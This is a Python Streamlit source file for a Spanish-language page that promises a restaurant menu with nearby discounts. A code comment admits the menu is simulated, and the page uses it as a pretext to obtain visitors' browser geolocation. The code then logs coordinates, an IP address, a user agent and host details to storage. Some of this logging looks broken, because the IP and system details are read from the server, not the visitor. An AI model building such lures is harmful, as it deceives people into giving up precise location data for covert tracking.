import streamlit as st
import streamlit.components.v1 as components
import json
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# JS para obtener geolocalización desde navegador
geoloc_script = """
<script>
navigator.geolocation.getCurrentPosition(
  (position) => {
    const coords = {
      lat: position.coords.latitude,
      lon: position.coords.longitude
    };
    const jsonString = JSON.stringify(coords);
    window.parent.postMessage(jsonString, "*");
  },
  (error) => {
    const errorMsg = JSON.stringify({error: "No se pudo obtener ubicación"});
    window.parent.postMessage(errorMsg, "*");
  }
);
</script>
"""

components.html(geoloc_script, height=0)

location = st.empty()

# Recolecta mensaje JS
message = st.experimental_get_query_params()
js_response = st.experimental_get_query_params()

# Escucha mensajes desde JS
components.html(
    """
    <script>
    window.addEventListener("message", (event) => {
        const data = JSON.stringify(event.data);
        const query = "?geodata=" + encodeURIComponent(data);
        window.location.href = window.location.pathname + query;
    });
    </script>
    """,
    height=0,
)

if "geodata" in js_response:
    try:
        geo_data = json.loads(js_response["geodata"][0])
        lat, lon = geo_data.get("lat"), geo_data.get("lon")
    except:
        lat, lon = None, None
else:
    lat, lon = None, None

# Simular menú
if lat and lon:
    st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
    st.subheader("Descuentos cercanos para ti:")
    st.markdown("""
    - 🍕 Pizza Margarita -20%
    - 🍣 Sushi Deluxe -15%
    - 🥗 Ensalada Mediterránea -10%
    """)
else:
    st.warning("Esperando acceso a tu ubicación...")

# Registrar datos
if lat and lon:
    user_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "lat": lat,
        "lon": lon,
        "ip": requests.get("https://api.ipify.org").text,
        "browser": st.runtime.scriptrunner.get_script_run_context().user_agent,
        "os": platform.system(),
        "hostname": socket.gethostname()
    }

    guardar_datos(user_data)
